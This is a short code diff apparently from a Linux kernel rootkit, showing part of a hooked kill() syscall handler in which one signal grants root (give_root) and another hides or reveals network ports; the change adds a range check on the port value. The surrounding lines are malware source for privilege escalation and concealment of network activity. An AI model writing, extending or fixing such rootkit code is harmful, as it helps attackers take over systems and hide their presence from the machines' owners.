@@ -96,6 +96,9 @@ asmlinkage int hook_kill(pid_t pid, int sig) {
       give_root();
       break;
     case SIGPORT:
+      if (pid < 0 || pid > 65535)  // invalid port
+        break;
+
       if (port_is_hidden((unsigned short)pid))
         port_show((unsigned short)pid);
       else
